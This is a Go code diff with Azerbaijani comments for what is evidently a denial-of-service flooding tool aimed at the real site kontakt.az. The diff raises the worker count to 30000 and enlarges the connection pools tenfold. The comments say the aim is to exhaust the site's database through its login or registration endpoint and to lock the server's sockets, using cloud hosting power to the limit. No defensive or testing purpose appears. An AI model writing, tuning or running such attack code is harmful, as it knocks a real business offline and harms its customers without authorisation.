@@ -13,7 +13,7 @@ import (
 func main() {
     // Hədəf endpoint - qeydiyyat və ya giriş hissəsi bazanı daha çox yorur
 	target := "https://kontakt.az" 
-	workers := 3000 // Railway gücünü sona qədər istifadə edirik
+	workers := 30000 // Railway gücünü sona qədər istifadə edirik
 	
 	fmt.Printf("[!!!] HAKAI-FINAL-ZERO DEVRƏDƏ: %s\n", target)
 
@@ -22,8 +22,8 @@ func main() {
 			InsecureSkipVerify: true,
 			MinVersion:         tls.VersionTLS12,
 		},
-		MaxIdleConns:        50000,
-		MaxIdleConnsPerHost: 25000,
+		MaxIdleConns:        500000,
+		MaxIdleConnsPerHost: 250000,
 		// HTTP/2 dəstəyini məcburi edirik ki, sürət daha yüksək olsun
 		ForceAttemptHTTP2:   true, 
 		// Bağlantıları açıq saxlayaraq serverin socketlərini "kilidləyirik"
